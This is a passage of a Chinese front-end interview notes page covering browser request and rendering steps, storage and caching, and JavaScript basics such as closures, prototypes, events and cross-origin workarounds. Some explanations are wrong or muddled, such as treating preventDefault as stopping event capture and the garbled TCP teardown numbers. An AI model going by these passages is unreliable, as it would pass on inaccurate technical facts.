id="基础版本"><a href="#基础版本" class="headerlink" title="基础版本"></a>基础版本</h4><ul><li>1.的浏览器根据请求的<code>URL</code> 交给 <code>DNS</code>域名解析，找到真实 <code>IP</code>，向服务器发起请求；</li><li>2.服务器交给后台处理完成后返回数据，浏览器接收文件<code>（ HTML、JS、CSS 、图象等）</code>；</li><li>3.浏览器对加载到的资源<code>（ HTML、JS、CSS 等）</code>进行语法解析，建立相应的内部数据结构<code>（如 HTML 的 DOM ）</code>；</li><li>4.载入解析到的资源文件，渲染页面，完成。</li></ul><h4 id="详细版"><a href="#详细版" class="headerlink" title="详细版"></a>详细版</h4><ul><li>1.从浏览器接收 <code>url</code> 到开启网络请求线程（这一部分可以展开浏览器的机制以及进程与线程之间的关系）</li><li>2.开启网络线程到发出一个完整的 <code>HTTP</code> 请求（这一部分涉及到dns查询， <code>TCP/IP</code>请求，五层因特网协议栈等知识）</li><li>3.从服务器接收到请求到对应后台接收到请求（这一部分可能涉及到负载均衡，安全拦截以及后台内部的处理等等）</li><li>4.后台和前台的 <code>HTTP</code> 交互（这一部分包括 <code>HTTP</code>头部、响应码、报文结构、 <code>cookie</code> 等知识，可以提下静态资源的 <code>cookie</code>优化，以及编码解码，如 <code>gzip</code> 压缩等）</li><li>5.单独拎出来的缓存问题， <code>HTTP</code> 的缓存（这部分包括<code>http缓存头部</code>， <code>ETag ， catchcontrol</code> 等）</li><li>6.浏览器接收到<code>HTTP</code>数据包后的解析流程（解析<code>html</code>-词法分析然后解析成<code>dom</code>树、解析 <code>css</code> 生成 <code>css</code>规则树、合并成 <code>render</code> 树，然后 <code>layout 、 painting</code>渲染、复合图层的合成、 <code>GPU</code> 绘制、外链资源的处理、 <code>loaded 和 DOMContentLoaded</code>等）</li><li>7.<code>CSS</code> 的可视化格式模型（元素的渲染规则，如包含块，控制框， <code>BFC</code>， IFC 等概念）</li><li>8.<code>JS</code> 引擎解析过程（<code>JS</code>的解释阶段，预处理阶段，执行阶段生成执行上下文，<code>VO</code>，作用域链、回收机制等等）</li><li>9.其它（可以拓展不同的知识模块，如跨域，<code>web</code>安全， <code>hybrid</code> 模式等等内容）</li></ul><h4 id="详细升级版"><a href="#详细升级版" class="headerlink" title="详细升级版"></a>详细升级版</h4><ul><li><p>1.在浏览器地址栏输入<code>URL</code></p></li><li><p>2.浏览器查看缓存，如果请求资源在缓存中并且新鲜，跳转到转码步骤</p><ul><li><p>2.1 如果资源未缓存，发起新请求</p></li><li><p>2.2 如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。</p></li><li><p>2.3 检验新鲜通常有两个</p><pre><code>HTTP</code></pre><p>头进行控制 </p><pre><code>Expires</code></pre><p> 和 </p><pre><code>Cache-Control</code></pre><p> ：</p><ul><li>2.3.1 <code>HTTP1.0</code>提供<code>Expires</code>，值为一个绝对时间表示缓存新鲜日期</li><li>2.3.2 <code>HTTP1.1</code>增加了<code>Cache-Control: max-age=</code>,值为以秒为单位的最大新鲜时间</li></ul></li></ul></li><li><p>3.浏览器解析<code>URL</code>获取协议，主机，端口，<code>path</code></p></li><li><p>4.浏览器组装一个<code>HTTP（GET）</code>请求报文</p></li><li><p>5.浏览器获取主机</p><pre><code>ip地址</code></pre><p>，过程如下：</p><ul><li>5.1 浏览器缓存</li><li>5.2 本机缓存</li><li>5.3 hosts文件</li><li>5.4 路由器缓存</li><li>5.5 ISP DNS缓存</li><li>5.6 DNS递归查询（可能存在负载均衡导致每次IP不一致）</li></ul></li><li><p>6.打开一个</p><pre><code>socket</code></pre><p>与目标</p><pre><code>IP地址</code></pre><p>，端口建立TCP链接，</p><pre><code>三次握手</code></pre><p>如下：</p><ul><li>6.1 客户端发送一个<code>TCP的SYN=1，Seq=X</code>的包到服务器端口</li><li>6.2 服务器发回<code>SYN=1，ACK=x+1,Seq=Y</code>的相应包</li><li>6.3 客户端发送<code>ACK=Y+1，Seq=z</code></li></ul></li><li><p>7.<code>TCP</code>链接建立后发送<code>HTTP</code>请求</p></li><li><p>8.服务器接收请求后解析，将请求转发到服务器程序，如虚拟主机使用<code>HTTP Host</code>头部判断请求的服务程序</p></li><li><p>9.服务器检测<code>HTTP</code>请求头是否包含缓存验证信息，如果验证缓存新鲜，返回304等对应状态</p></li><li><p>10.出合理程序读取完整请求并准备<code>HTTP</code>相应，可能需要查询数据库等操作</p></li><li><p>11.服务器将相应报文通过<code>TCP</code>链接发送回浏览器</p></li><li><p>12.浏览器接收</p><pre><code>HTTP</code></pre><p>相应，然后根据情况选择关闭</p><pre><code>TCP</code></pre><p>链接或者保留重用，关闭TCP链接的四次握手如下：</p><ul><li>12.1 主动方发送<code>Fin=1,ACK=z,Seq=x</code>报文</li><li>12.2 被动方发送<code>ACK=X+1,Seq=Y</code>报文</li><li>12.3 被动方发送<code>Fin=1,ACK=X,Seq=Y</code>报文</li><li>12.4 主动方发送<code>ACK=Y,Seq=x</code>报文</li></ul></li><li><p>13.浏览器检查相应状态码</p></li><li><p>14.如果资源可缓存，进行缓存</p></li><li><p>15.对相应进行解码</p></li><li><p>16.根据资源类型决定如何处理</p></li><li><p>17.解析<code>HTML</code>文档，构建<code>DOM</code>树，下载资源，构建<code>CSSOM</code>树，执行js脚本，这些操作每月严格的先后顺序</p></li><li><p>18.构建DOM树：</p><ul><li>18.1 Tokenizing：根据HTML规范将字符流解析为标记</li><li>18.2 Lexing：词法分析将标记转换为对象并定义属性和规则</li><li>18.3 DOM construction：根据HTML标记关系将对象组成DOM树</li></ul></li><li><p>19.解析过程中遇到图片、样式表、js文件，启动下载</p></li><li><p>20.构建</p><pre><code>CSSOM</code></pre><p>树：</p><ul><li>20.1 <code>Tokenizing</code>：字符流转换为标记流</li><li>20.2 <code>Node</code>：根据标记创建节点</li><li>20.3 <code>CSSOM</code>：节点创建CSSOM树</li></ul></li><li><ol><li>根据<code>DOM树和CSSOM树</code>构建渲染树</li></ol><ul><li>21.1 从<code>DOM树</code>的根节点遍历所有可见节点，不可见节点包括：1） <code>script , meta</code>这样本身不可见的标签。2)被css隐藏的节点，如 display: none</li><li>21.2 对每一个可见节点，找到恰当的<code>CSSOM</code>规则并应用</li><li>21.3 发布可视节点的内容和计算样式</li></ul></li><li><p>22.js解析如下</p><ul><li>22.1 浏览器创建<code>Document对象</code>并解析<code>HTML</code>，将解析到的元素和文本节点添加到文档中，此时<code>document.readystate为loading</code></li><li>22.2 HTML解析器遇到没有<code>async和defer的script时</code>，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用<code>document.write()</code>把文本插入到输入流中。同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作script和他们之前的文档内容</li><li>22.3 当解析器遇到设置了<code>async属性的script</code>时，开始下载脚本并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器不会停下来等它下载。异步脚本禁止使用<code>document.write()</code>，它们可以访问自己script和之前的文档元素</li><li>22.4 当文档完成解析，<code>document.readState变成interactive</code></li><li>22.5 所有<code>defer脚本</code>会按照在文档出现的顺序执行，延迟脚本能访问完整文档树，禁止使用<code>document.write()</code></li><li>22.6 浏览器在<code>Document</code>对象上触发<code>DOMContentLoaded事件</code></li><li>22.7 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些内容完成载入并且所有异步脚本完成载入和执行，<code>document.readState变为complete，window触发load事件</code></li></ul></li><li><p>23.显示页面（HTML解析过程中会逐步显示页面）</p></li></ul><h3 id="cookies-，-sessionStorage-和-localStorage-的区别"><a href="#cookies-，-sessionStorage-和-localStorage-的区别" class="headerlink" title="cookies ， sessionStorage 和 localStorage 的区别"></a>cookies ， sessionStorage 和 localStorage 的区别</h3><ul><li><code>cookie</code> 是网站为了标示用户身份而储存在用户本地终端上的数据（通常经过加密）</li><li><code>cookie</code>数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递（优化点）</li><li><code>sessionStorage</code> 和 <code>localStorage</code> 不会自动把数据发给服务器，仅在本地保存</li><li>存储大小：<ul><li><code>cookie</code> 数据大小不能超过4k</li><li><code>sessionStorage 和 localStorage</code>虽然也有存储大小的限制，但比 cookie 大得多，可以达到5M或更大</li></ul></li><li>有期时间：</li></ul><p><code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据</p><p><code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除</p><p><code>cookie 设置的 cookie</code> 过期时间之前一直有效，即使窗口或浏览器关闭</p><h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><blockquote><p>浏览器缓存分为强缓存和协商缓存。当客户端请求某个资源时，获取缓存的流程如下</p></blockquote><ul><li>先根据这个资源的一些 <code>http header</code> 判断它是否命中强缓存，如果命中，则直接从本地获取缓存资源，不会发请求到服务器；</li><li>当强缓存没有命中时，客户端会发送请求到服务器，服务器通过另一些 <code>request header</code>验证这个资源是否命中协商缓存，称为<code>http</code> 再验证，如果命中，服务器将请求返回，但不返回资源，而是告诉客户端直接从缓存中获取，客户端收到返回后就会从缓存中获取资源；</li><li>强缓存和协商缓存共同之处在于，如果命中缓存，服务器都不会返回资源； 区别是，强缓存不对发送请求到服务器，但协商缓存会。</li><li>当协商缓存也没命中时，服务器就会将资源发送回客户端。</li><li>当 <code>ctrl+f5</code> 强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；</li><li>当 <code>f5</code> 刷新网页时，跳过强缓存，但是会检查协商缓存；</li></ul><p><a href="https://juejin.cn/post/6844903763665240072#heading-5" target="_blank" rel="noopener">强缓存-协商缓存：这篇文章介绍挺细的：https://juejin.cn/post/6844903763665240072#heading-5</a></p><h2 id="JS-篇"><a href="#JS-篇" class="headerlink" title="JS 篇"></a>JS 篇</h2><h3 id="说几条写JavaScript的基本规范"><a href="#说几条写JavaScript的基本规范" class="headerlink" title="说几条写JavaScript的基本规范"></a>说几条写JavaScript的基本规范</h3><ul><li>不要在同一行声明多个变量</li><li>请是用 ===/!== 来比较 <code>true/false</code>或者数值</li><li>使用对象字面量替代<code>new Array</code>这种形式</li><li>不要使用全局函数</li><li><code>Switch</code> 语句必须带有 <code>default</code> 分支</li><li><code>If</code>语句必须使用大括号</li><li><code>for-in</code> 循环中的变量 应该使用 <code>let</code> 关键字明确限定作用域，从而避免作用域污染</li></ul><h3 id="绕不过去的闭包"><a href="#绕不过去的闭包" class="headerlink" title="绕不过去的闭包"></a>绕不过去的闭包</h3><ul><li>闭包就是能够读取其他函数内部变量的函数</li><li>闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个</li><li>函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域</li><li>闭包的特性：<ul><li>函数内再嵌套函数</li><li>内部函数可以引用外层的参数和变量</li><li>参数和变量不会被垃圾回收机制回收</li></ul></li><li>优点：能够实现封装和缓存等</li><li>缺点：消耗内存、使用不当会内存溢出，</li><li>解决方法：在退出函数之前，将不使用的局部变量全部删除</li></ul><h3 id="说说你对作用域链的理解"><a href="#说说你对作用域链的理解" class="headerlink" title="说说你对作用域链的理解"></a>说说你对作用域链的理解</h3><ul><li>作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到 <code>window</code>对象即被终止，作用域链向下访问变量是不被允许的。</li><li>简单的说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期</li></ul><h3 id="JavaScript原型，原型链-有什么特点？"><a href="#JavaScript原型，原型链-有什么特点？" class="headerlink" title="JavaScript原型，原型链 ? 有什么特点？"></a>JavaScript原型，原型链 ? 有什么特点？</h3><ul><li>每个对象都会在其内部初始化一个属性，就是 <code>prototype</code> (原型)，当我们访问一个对象的属性时,如果这个对象内部不存在这个属性，那么他就会去 <code>prototype</code> 里找这个属性，这个<code>prototype</code> 又会有自己的 <code>prototype</code> ，于是就这样一直找下去，也就是我们平时所说的原型链的概念</li><li>关系： <code>instance.constructor.prototype = instance._*proto*_</code></li><li>特点：<code>JavaScript</code> 对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变当我们需要一个属性的时， <code>Javascript</code> 引擎会先看当前对象中是否有这个属性， 如果没有的,就会查找他的 <code>Prototype</code> 对象是否有这个属性，如此递推下去，一直检索到 <code>Object</code>内建对象</li></ul><h3 id="请解释什么是事件委托-事件代理"><a href="#请解释什么是事件委托-事件代理" class="headerlink" title="请解释什么是事件委托/事件代理"></a>请解释什么是事件委托/事件代理</h3><ul><li>事件代理<code>（ Event Delegation ）</code>，又称之为事件委托。是 <code>JavaScript</code> 中常用的绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是<code>DOM</code>元素的事件冒泡。使用事件代理的好处是可以提高性能</li><li>可以大量节省内存占用，减少事件注册，比如在 <code>table</code>上代理所有 <code>td 的 click</code> 事件就非常棒</li><li>可以实现当新增子对象时无需再次对其绑定</li></ul><h3 id="Javascript如何实现继承？"><a href="#Javascript如何实现继承？" class="headerlink" title="Javascript如何实现继承？"></a>Javascript如何实现继承？</h3><ul><li>构造继承</li><li>原型继承</li><li>实例继承</li><li>拷贝继承</li><li>原型 <code>prototype</code>机制或 <code>apply 和 call</code> 方法去实现较简单，建议使用构造函数与原型混合方式</li></ul><pre class="line-numbers language-java"><code class="language-java">function <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'wang'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>function <span class="token function">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Child<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//继承了Parent，通过原型</span>var demo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>demo<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>demo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到被继承的属性</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="谈谈This对象的理解"><a href="#谈谈This对象的理解" class="headerlink" title="谈谈This对象的理解"></a>谈谈This对象的理解</h3><ul><li><code>this</code>总是指向函数的直接调用者（而非间接调用者）</li><li>如果有 <code>new</code> 关键字， <code>this</code> 指向 <code>new</code> 出来的那个对象</li><li>在事件中，<code>this</code> 指向触发这个事件的对象，特殊的是，<code>IE</code>中的 <code>attachEvent 中的this</code> 总是指向全局对象 <code>Window</code></li></ul><h3 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h3><blockquote><p><code>W3C</code> 中定义事件的发生经历三个阶段：捕获阶段（<code>capturing</code> ）、目标阶段 （<code>targetin</code>）、冒泡阶段（ <code>bubbling</code>）</p></blockquote><ul><li>冒泡型事件：当你使用事件冒泡时，子级元素先触发，父级元素后触发</li><li>捕获型事件：当你使用事件捕获时，父级元素先触发，子级元素后触发</li><li><code>DOM</code> 事件流：同时支持两种事件模型：捕获型事件和冒泡型事件</li><li>阻止冒泡：在 <code>W3c</code> 中，使用 <code>stopPropagation()</code> 方法；在IE下设置 <code>cancelBubble =true</code></li><li>阻止捕获：阻止事件的默认行为，例如<code>click - a</code>后的跳转。在 <code>W3c</code>中，使用<code>preventDefault()</code> 方法，在 IE 下设置 <code>window.event.returnValue = false</code></li></ul><h3 id="new操作符具体干了什么呢"><a href="#new操作符具体干了什么呢" class="headerlink" title="new操作符具体干了什么呢?"></a>new操作符具体干了什么呢?</h3><ul><li>创建一个空对象，并且 <code>this</code> 变量引用该对象，同时还继承了该函数的原型</li><li>属性和方法被加入到 <code>this</code> 引用的对象中</li><li>新创建的对象由 <code>this</code> 所引用，并且最后隐式的返回 <code>this</code></li></ul><h3 id="Ajax原理"><a href="#Ajax原理" class="headerlink" title="Ajax原理"></a>Ajax原理</h3><ul><li><code>Ajax</code> 的原理简单来说是在用户和服务器之间加了—个中间层( AJAX 引擎)，通过<code>XmlHttpRequest</code> 对象来向服务器发异步请求，从服务器获得数据，然后用 <code>javascript</code>来操作 <code>DOM</code> 而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据</li><li><code>Ajax</code>的过程只涉及<code>JavaScript 、 XMLHttpRequest 和 DOM 。 XMLHttpRequest</code>是<code>ajax</code>的核心机制</li></ul><h3 id="如何解决跨域问题"><a href="#如何解决跨域问题" class="headerlink" title="如何解决跨域问题?"></a>如何解决跨域问题?</h3><blockquote><p>首先了解下浏览器的同源策略 同源策略 <code>/SOP（Same origin policy）</code> 是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 <code>XSS 、 CSFR</code>等攻击。所谓同源是指<code>&quot;协议+域名+端口&quot;</code>三者相同，即便两个不同的域名指向同一个ip地址，也非同源</p></blockquote><ul><li>通过<code>jsonp</code>跨域</li></ul><pre class="line-numbers language-java"><code class="language-java">var script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text/javascript'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 传参并指定回调执行函数为onBack</span>script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://www.....:8080/login?user=admin&amp;callback=onBack'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 回调执行函数</span>function <span class="token function">onBack</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">alert</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>document.domain + iframe</code>跨域</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//父窗口：(http://www.domain.com/a.html)</span><span class="token operator">&lt;</span>iframe id<span class="token operator">=</span><span class="token string">"iframe"</span> src<span class="token operator">=</span><span class="token string">"http://child.domain.com/b.html"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span> document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'domain.com'</span><span class="token punctuation">;</span> var user <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment" spellcheck="true">//子窗口：(http://child.domain.com/b.html)</span>document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'domain.com'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取父窗口中变量</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'get js data from parent ---> '</span> <span class="token operator">+</span> window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>nginx</code>代理跨域</li><li><code>nodejs</code>中间件代理跨域</li><li>后端在头部信息里面设置安全域名</li></ul><h3 id="说说你对AMD和Commonjs的理解"><a href="#说说你对AMD和Commonjs的理解" class="headerlink" title="说说你对AMD和Commonjs的理解"></a>说说你对AMD和Commonjs的理解</h3><ul><li><code>CommonJS</code> 是服务器端模块的规范， <code>Node.js</code> 采用了这个规范。 <code>CommonJS</code> 规范加载模</li></ul><p>块是同步的，也就是说，只有加载完成，才能执行后面的操作。<code>AMD</code>规范则是非同步加载 模块，允许指定回调函数</p><ul><li><code>AMD</code> 推荐的风格通过返回一个对象做为模块对象， <code>CommonJS</code>的风格通过对</li></ul><p><code>module.exports 或 exports</code>的属性赋值来达到暴露模块对象的目的</p><h3 id="js的7种基本数据类型"><a href="#js的7种基本数据类型" class="headerlink" title="js的7种基本数据类型"></a>js的7种基本数据类型</h3><p><code>Undefined 、 Null 、Boolean 、Number 、String 、Bigint 、Symbol</code> </p><h3 id="介绍js有哪些内置对象"><a href="#介绍js有哪些内置对象" class="headerlink" title="介绍js有哪些内置对象"></a>介绍js有哪些内置对象</h3><ul><li><code>Object</code> 是 <code>JavaScript</code>中所有对象的父对象</li><li>数据封装类对象： <code>Object 、 Array 、 Boolean 、 Number 和 String</code></li><li>其他对象： <code>Function 、 Arguments 、 Math 、 Date 、 RegExp 、 Error</code></li></ul><h3 id="JS有哪些方法定义对象"><a href="#JS有哪些方法定义对象" class="headerlink" title="JS有哪些方法定义对象"></a>JS有哪些方法定义对象</h3><ul><li>对象字面量： <code>var obj = {}</code>;</li><li>构造函数： <code>var obj = new Object()</code>;</li><li>Object.create(): <code>var obj = Object.create(Object.prototype);</code></li></ul><h3 id="你觉得jQuery源码有哪些写的好的地方"><a href="#你觉得jQuery源码有哪些写的好的地方" class="headerlink" title="你觉得jQuery源码有哪些写的好的地方"></a>你觉得jQuery源码有哪些写的好的地方</h3><ul><li><code>jquery</code> 源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入 <code>window</code> 对象参数，可以使 <code>window</code>对象作为局部变量使用，好处是当 <code>jquery</code>中访问<code>window</code>对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问<code>window</code>对象。同样，传入 <code>undefined</code>参数，可以缩短查找 <code>undefined</code> 时的作用域链</li><li><code>jquery</code>将一些原型属性和方法封装在了 <code>jquery.prototype</code>中，为了缩短名称，又赋值给了 <code>jquery.fn</code>，这是很形象的写法</li><li>有一些数组或对象的方法经常能使用到， <code>jQuery</code> 将其保存为局部变量以提高访问速度</li><li><code>jquery</code>实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率</li></ul><h3 id="null，undefined-的区别"><a href="#null，undefined-的区别" class="headerlink" title="null，undefined 的区别"></a>null，undefined 的区别</h3><ul><li><code>undefined</code> 表示不存在这个值。</li><li><code>undefined</code>:是一个表示”无”的原始值或者说表示”缺少值”，就是此处应该有一个值，但是还没有定义。尝试读取时会返回 <code>undefined</code></li><li>例如变量被声明了，但没有赋值时，就等于 <code>undefined</code></li><li><code>null</code> 表示一个对象被定义了，值为“空值”</li><li><code>null</code>: 是一个对象(空对象, 没有任何属性和方法)</li><li>例如作为函数的参数，表示该函数的参数不是对象；</li><li>在验证 <code>null</code> 时，一定要使用 === ，因为 == 无法分别 <code>null 和 undefined</code></li></ul><h3 id="谈谈你对ES6的理解"><a href="#谈谈你对ES6的理解" class="headerlink" title="谈谈你对ES6的理解"></a>谈谈你对ES6的理解</h3><ul><li>新增模板字符串（为 <code>JavaScript</code> 提供了简单的字符串插值功能）</li><li>箭头函数</li><li><code>for-of</code>（用来遍历数据—例如数组中的值。）</li><li><code>arguments</code> 对象可被不定参数和默认参数完美代替。</li><li><code>ES6</code>将<code>promise</code> 对象纳入规范，提供了原生的 <code>Promise</code>对象。</li><li>增加了 <code>let 和 const</code> 命令，用来声明变量。</li><li>还有就是引入 <code>module</code> 模块的概念</li></ul><p><a href="https://es6.ruanyifeng.com/#docs/style" target="_blank" rel="noopener">更多ES新语法：阮一峰的ES入门：https://es6.ruanyifeng.com/#docs/style</a></p><h3 id="面向对象编程思想"><a href="#面向对象编程思想" class="headerlink" title="面向对象编程思想"></a>面向对象编程思想</h3><ul><li>基本思想是使用对象，类，继承，封装等基本概念来进行程序设计</li><li>易维护</li><li>易扩展</li><li>开发工作的重用性、继承性高，降低重复工作量。</li><li>缩短了开发周期</li></ul><h3 id="如何通过JS判断一个数组"><a href="#如何通过JS判断一个数组" class="headerlink" title="如何通过JS判断一个数组"></a>如何通过JS判断一个数组</h3><ul><li><code>instanceof</code> 运算符是用来测试一个对象是否在其原型链原型构造函数的属性</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>isArray</code></li></ul><pre class="line-numbers language-js"><code class="language-js">Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>constructor</code> 属性返回对创建此对象的数组函数的引用，就是返回对象相对应的构造函数</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span>constructor <span class="token operator">==</span> Array<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>Object.prototype</code></li></ul><pre class="line-numbers language-js"><code class="language-js">Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'[object Array]'</span><span class="token comment" spellcheck="true">// 写个方法</span><span class="token keyword">var</span> isType <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//return Object.prototype.toString.apply([obj]).slice(8,-1);</span><span class="token punctuation">}</span><span class="token function">isType</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//Array</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="异步编程的实现方式"><a href="#异步编程的实现方式" class="headerlink" title="异步编程的实现方式"></a>异步编程的实现方式</h3><ul><li><p>回调函数</p><ul><li>优点：简单、容易理解</li><li>缺点：不利于维护，代码耦合高</li></ul></li><li><p>事件监听(采用时间驱动模式，取决于某个事件是否发生)</p><ul><li>优点：容易理解，可以绑定多个事件，每个事件可以指定多个回调函数</li><li>缺点：事件驱动型，流程不够清晰</li></ul></li><li><p>发布/订阅(观察者模式)</p><ul><li>类似于事件监听，但是可以通过‘消息中心‘，了解现在有多少发布者，多少订阅者</li></ul></li><li><pre><code>Promise</code></pre><p>对象</p><ul><li>优点：可以利用<code>then</code>方法，进行链式写法；可以书写错误时的回调函数；</li><li>缺点：编写和理解，相对比较难</li></ul></li><li><pre><code>Generator</code></pre><p>函数</p><ul><li>优点：函数体内外的数据交换、错误处理机制</li><li>缺点：流程管理不方便</li></ul></li><li><pre><code>async</code></pre><p>函数</p><ul><li>优点：内置执行器、更好的语义、更广的适用性、返回的是<code>Promise</code>、结构清晰。</li><li>缺点：错误处理机制</li></ul></li></ul><h3 id="对原生Javascript了解方向"><a href="#对原生Javascript了解方向" class="headerlink" title="对原生Javascript了解方向"></a>对原生Javascript了解方向</h3><p>数据类型、运算、对象、<code>Function</code>、继承、闭包、作用域、原型链、事件、 <code>RegExp</code>、<code>JSON</code> 、 <code>Ajax</code>、 <code>DOM</code> 、 <code>BOM</code>、内存泄漏、跨域、异步装载、模板引擎、<code>前端MVC</code>、路由、模块化、 <code>Canvas</code>、 <code>ECMAScript</code></p><h3 id="sort-快速打乱数组"><a href="#sort-快速打乱数组" class="headerlink" title="sort 快速打乱数组"></a>sort 快速打乱数组</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> arr <span class="token operator">=</span> 